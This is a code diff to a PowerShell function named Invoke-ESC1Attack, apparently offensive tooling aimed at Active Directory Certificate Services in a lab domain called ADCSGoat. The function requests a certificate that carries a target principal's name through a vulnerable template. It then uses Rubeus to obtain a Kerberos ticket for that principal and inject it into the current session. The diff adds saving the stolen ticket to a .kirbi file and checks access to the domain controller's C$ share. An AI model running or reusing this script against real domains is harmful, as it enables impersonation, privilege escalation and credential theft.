@@ -452,6 +452,7 @@ function Invoke-ESC1Attack {
                     # Use Rubeus to request TGT with the certificate
                     $rubeusOutput = $null
                     $rubeusExitCode = $null
+                    $kirbiFile = $null
                     if ($certificate) {
                         try {
                             Write-Host "[i] Using Rubeus to request TGT with certificate..." -ForegroundColor Cyan
@@ -460,17 +461,26 @@ function Invoke-ESC1Attack {
                             # Use UPN if available, otherwise use DOMAIN\username format
                             $rubeusUserValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
                             
+                            # Create kirbi filename
+                            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+                            $kirbiFileName = "$($targetName)_$timestamp.kirbi"
+                            $kirbiFilePath = Join-Path $OutputPath $kirbiFileName
+                            
                             $rubeusArgs = @(
                                 "asktgt"
                                 "/user:$rubeusUserValue"
                                 "/certificate:$certificate"
+                                "/outfile:$kirbiFilePath"
                                 "/ptt"
                             )
                             
                             Write-Verbose "Rubeus command: $RubeusPath $($rubeusArgs -join ' ')"
+                            Write-Verbose "Kirbi file will be saved to: $kirbiFilePath"
                             
                             # Execute Rubeus
                             $rubeusOutput = & $RubeusPath $rubeusArgs 2>&1
+                            $rubeusOutput += klist
+                            $rubeusOutput += Get-ChildItem \\ADCSGoat-DC\C$
                             $rubeusExitCode = $LASTEXITCODE
                             
                             Write-Verbose "Rubeus.exe exit code: $rubeusExitCode"
@@ -478,7 +488,18 @@ function Invoke-ESC1Attack {
                             
                             if ($rubeusExitCode -eq 0) {
                                 Write-Host "[+] TGT successfully requested and applied!" -ForegroundColor Green
-                                Write-Host "[!] New user context: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Yellow
+                                
+                                # Verify kirbi file was created
+                                if (Test-Path $kirbiFilePath) {
+                                    $kirbiFile = $kirbiFilePath
+                                    Write-Host "[+] Kirbi file saved to: $kirbiFilePath" -ForegroundColor Green
+                                } else {
+                                    Write-Warning "Kirbi file was not created at expected location: $kirbiFilePath"
+                                }
+                                
+                                # Write-Host "[!] New user context: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Yellow
+                                Write-Host (Get-ChildItem \\ADCSGoat-DC\C$)
+                                klist
                                 
                             } else {
                                 Write-Warning "Rubeus failed with exit code $rubeusExitCode"
@@ -501,6 +522,7 @@ function Invoke-ESC1Attack {
                         CertifyOutput = $certifyOutput -join "`n"
                         RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                         RubeusExitCode = $rubeusExitCode
+                        KirbiFile = $kirbiFile
                         ExitCode = $exitCode
                         Error = $null
                     }
@@ -547,17 +569,24 @@ function Invoke-ESC1Attack {
                     CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
                     RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                     RubeusExitCode = $rubeusExitCode
+                    KirbiFile = if ($kirbiFile) { $kirbiFile } else { $null }
                     ExitCode = if ($exitCode) { $exitCode } else { $null }
                 }
             }
         } else {
             # WhatIf mode
+            # Generate kirbi filename for WhatIf display
+            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+            $kirbiFileName = "$($targetName)_$timestamp.kirbi"
+            $kirbiFilePath = Join-Path $OutputPath $kirbiFileName
+            
             Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
             Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
             Write-Host "What if: Would extract certificate from Certify output" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
             Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
-            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /ptt" -ForegroundColor Yellow
+            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /outfile:$kirbiFilePath /ptt" -ForegroundColor Yellow
+            Write-Host "What if: Would save kirbi file to: $kirbiFilePath" -ForegroundColor Yellow
             
             return [PSCustomObject]@{
                 Success = $true
@@ -569,6 +598,7 @@ function Invoke-ESC1Attack {
                 CertifyOutput = "WhatIf mode - attack not executed"
                 RubeusOutput = "WhatIf mode - Rubeus not executed"
                 RubeusExitCode = 0
+                KirbiFile = $null
                 ExitCode = 0
                 Error = $null
             }
